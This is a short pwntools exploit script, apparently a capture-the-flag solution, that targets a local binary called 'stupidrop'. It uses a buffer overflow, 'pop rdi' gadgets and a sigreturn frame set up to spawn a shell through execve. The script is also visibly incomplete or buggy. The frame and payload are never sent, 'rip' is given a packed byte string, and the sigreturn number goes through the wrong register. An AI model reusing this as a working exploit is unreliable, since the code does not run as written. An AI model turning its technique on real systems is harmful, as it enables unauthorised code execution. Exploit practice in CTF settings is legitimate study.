from pwn import *

target = process("./stupidrop")

context.arch = "amd64"
poprdi = 0x4006a3
syscall = 0x000000000040063e

payload = "a" * 48

payload += p64(poprdi)
payload += p64(0xf)
payload += p64(poprdi) + p64(0)

frame = SigreturnFrame()

frame.rip = p64(syscall)
frame.rax = 0x3b
frame.rdi = 0x601050
frame.rsi = 0x0
frame.rdx = 0x0



target.interactive()
